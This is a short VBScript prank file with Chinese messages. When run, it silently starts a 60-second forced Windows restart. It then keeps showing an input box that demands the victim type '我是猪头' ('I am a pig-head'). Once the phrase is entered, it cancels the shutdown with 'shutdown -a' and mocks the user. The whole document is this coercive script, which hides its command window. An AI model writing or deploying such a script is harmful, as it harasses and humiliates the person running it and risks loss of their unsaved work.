dim WSHshellA 
set WSHshellA = wscript.createobject("wscript.shell") 
WSHshellA.run "cmd.exe /c shutdown -r -t 60 -c ""说我是猪头，不说我是猪头，就一分钟关你机，不信，试试···"" ",0 ,true 
dim a 
do while(a <> "我是猪头") 
a = inputbox ("说我是猪头,就不关机，快撒，说 ""我是猪头""　","说不说","不说",8000,7000) 
msgbox chr(13) + chr(13) + chr(13) + a,0,"MsgBox" 
loop 
msgbox chr(13) + chr(13) + chr(13) + "早说就行了嘛" 
dim WSHshell 
set WSHshell = wscript.createobject("wscript.shell") 
WSHshell.run "cmd.exe /c shutdown -a",0 ,true 
msgbox chr(13) + chr(13) + chr(13) + "哈哈哈哈，真过瘾" 
